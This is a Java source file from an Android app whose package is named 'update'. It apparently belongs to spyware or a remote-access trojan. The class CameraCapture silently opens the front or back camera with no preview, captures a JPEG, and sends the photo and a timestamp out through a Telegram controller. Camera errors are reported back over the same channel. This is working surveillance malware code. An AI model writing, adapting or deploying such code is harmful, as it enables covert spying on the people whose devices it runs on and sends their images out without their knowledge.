package com.kasari.update;

import android.content.Context;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.media.Image;
import android.media.ImageReader;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.view.Surface;
import androidx.annotation.NonNull;
import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;
import java.util.Locale;

public class CameraCapture {

    private static CameraDevice cameraDevice;
    private static CameraCaptureSession captureSession;
    private static ImageReader imageReader;
    private static HandlerThread backgroundThread;
    private static Handler backgroundHandler;
    private static Context contextRef;
    private static boolean isFrontCamera = true;

    public static void takePhoto(Context context, boolean useFrontCamera) {
        contextRef = context;
        isFrontCamera = useFrontCamera;
        
        try {
            CameraManager manager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            String cameraId = getCameraId(manager, useFrontCamera);
            
            if (cameraId == null) {
                TelegramController.sendMessage(context, "📷 Camera not available");
                return;
            }
            
            startBackgroundThread();
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                manager.openCamera(cameraId, new CameraDevice.StateCallback() {
                    @Override
                    public void onOpened(@NonNull CameraDevice device) {
                        cameraDevice = device;
                        createCameraPreviewSession();
                    }

                    @Override
                    public void onDisconnected(@NonNull CameraDevice device) {
                        device.close();
                        cameraDevice = null;
                    }

                    @Override
                    public void onError(@NonNull CameraDevice device, int error) {
                        device.close();
                        cameraDevice = null;
                        TelegramController.sendMessage(context, "📷 Camera error: " + error);
                    }
                }, backgroundHandler);
            }
        } catch (Exception e) {
            e.printStackTrace();
            TelegramController.sendMessage(context, "📷 Camera failed: " + e.getMessage());
        }
    }

    private static String getCameraId(CameraManager manager, boolean frontCamera) {
        try {
            for (String cameraId : manager.getCameraIdList()) {
                CameraCharacteristics characteristics = manager.getCameraCharacteristics(cameraId);
                Integer facing = characteristics.get(CameraCharacteristics.LENS_FACING);
                if (facing != null) {
                    if (frontCamera && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                        return cameraId;
                    } else if (!frontCamera && facing == CameraCharacteristics.LENS_FACING_BACK) {
                        return cameraId;
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    private static void createCameraPreviewSession() {
        try {
            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 1);
            imageReader.setOnImageAvailableListener(reader -> {
                try (Image image = reader.acquireLatestImage()) {
                    if (image != null) {
                        ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                        byte[] bytes = new byte[buffer.remaining()];
                        buffer.get(bytes);
                        
                        String timestamp = new SimpleDateFormat("dd-MM-yyyy HH:mm:ss", 
                            Locale.getDefault()).format(new Date());
                        String camType = isFrontCamera ? "Front" : "Back";
                        
                        TelegramController.sendPhoto(contextRef, bytes, 
                            "📷 " + camType + " Camera Photo\nTime: " + timestamp);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
                
                closeCamera();
            }, backgroundHandler);

            Surface surface = imageReader.getSurface();
            cameraDevice.createCaptureSession(Arrays.asList(surface), 
                new CameraCaptureSession.StateCallback() {
                    @Override
                    public void onConfigured(@NonNull CameraCaptureSession session) {
                        try {
                            captureSession = session;
                            CaptureRequest.Builder builder = 
                                cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                            builder.addTarget(surface);
                            builder.set(CaptureRequest.JPEG_QUALITY, (byte) 85);
                            captureSession.capture(builder.build(), null, backgroundHandler);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }

                    @Override
                    public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                        TelegramController.sendMessage(contextRef, "📷 Camera configuration failed");
                    }
                }, backgroundHandler);
                
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void closeCamera() {
        try {
            if (captureSession != null) {
                captureSession.close();
                captureSession = null;
            }
            if (cameraDevice != null) {
                cameraDevice.close();
                cameraDevice = null;
            }
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
            stopBackgroundThread();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void startBackgroundThread() {
        backgroundThread = new HandlerThread("CameraBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
    }

    private static void stopBackgroundThread() {
        if (backgroundThread != null) {
            backgroundThread.quitSafely();
            try {
                backgroundThread.join();
                backgroundThread = null;
                backgroundHandler = null;
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }
}